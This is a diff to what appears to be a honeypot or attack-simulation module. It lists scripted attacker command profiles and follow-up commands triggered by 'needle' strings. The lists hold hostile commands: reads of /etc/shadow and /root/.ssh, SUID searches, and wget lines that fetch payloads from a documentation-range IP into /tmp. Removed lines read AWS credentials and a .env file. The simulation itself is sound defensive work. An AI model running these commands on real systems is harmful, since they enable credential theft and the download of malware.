@@ -67,16 +67,12 @@ PROFILE_COMMANDS = {
         "id",
         "cat /etc/passwd",
         "cat /etc/shadow",
-        "ls -la /home",
-        "ls -la /home/admin",
-        "ls -la /home/admin/loot",
-        "ls -la /home/admin/.aws",
+        "ls -la /root",
+        "ls -la /root/.ssh",
         "ps aux",
         "netstat -tulnp",
         "cat /proc/version",
-        "ls /var/www",
-        "ls -la /home/admin/loot",
-        "cat /opt/novapay/.env",
+        "ls -la /etc",
         "wget http://203.0.113.10/malware.sh -O /tmp/m.sh",
     ],
     "targeted": [
@@ -86,10 +82,8 @@ PROFILE_COMMANDS = {
         "cat /etc/passwd",
         "cat /etc/shadow",
         "cat /etc/ssh/sshd_config",
-        "ls -la /home",
         "ls -la /root",
-        "ls -la /home/admin/loot",
-        "ls -la /home/admin/.aws",
+        "ls -la /root/.ssh",
         "history",
         "cat /proc/version",
         "ifconfig",
@@ -98,8 +92,6 @@ PROFILE_COMMANDS = {
         "crontab -l",
         "ls /var/log",
         "cat /var/log/auth.log",
-        "ls -la /home/admin/loot",
-        "cat /opt/novapay/.env",
         "find / -name '*.conf' 2>/dev/null | head -10",
         "find / -perm -4000 2>/dev/null | head -10",
         "wget http://203.0.113.10/payload -O /tmp/.hidden",
@@ -122,17 +114,13 @@ PROFILE_MAX_ATTEMPTS = {
 
 
 DISCOVERY_FOLLOW_UPS = {
-    "ls -la /home/admin/loot": {
-        "needle": "system_audit.txt",
-        "command": "cat /home/admin/loot/system_audit.txt",
+    "cat /etc/passwd": {
+        "needle": "backupsvc:x:1004:1004:Backup Service",
+        "command": "grep -E 'backupsvc|cloudsync' /etc/passwd",
     },
-    "ls -la /home/admin/.aws": {
-        "needle": "credentials",
-        "command": "cat /home/admin/.aws/credentials",
-    },
-    "cat /opt/novapay/.env": {
-        "needle": "rotation_marker=shadowmesh_live_credentials",
-        "command": "grep AWS /opt/novapay/.env",
+    "cat /etc/shadow": {
+        "needle": "backupsvc:",
+        "command": "grep -E 'backupsvc|cloudsync' /etc/shadow",
     },
 }
 
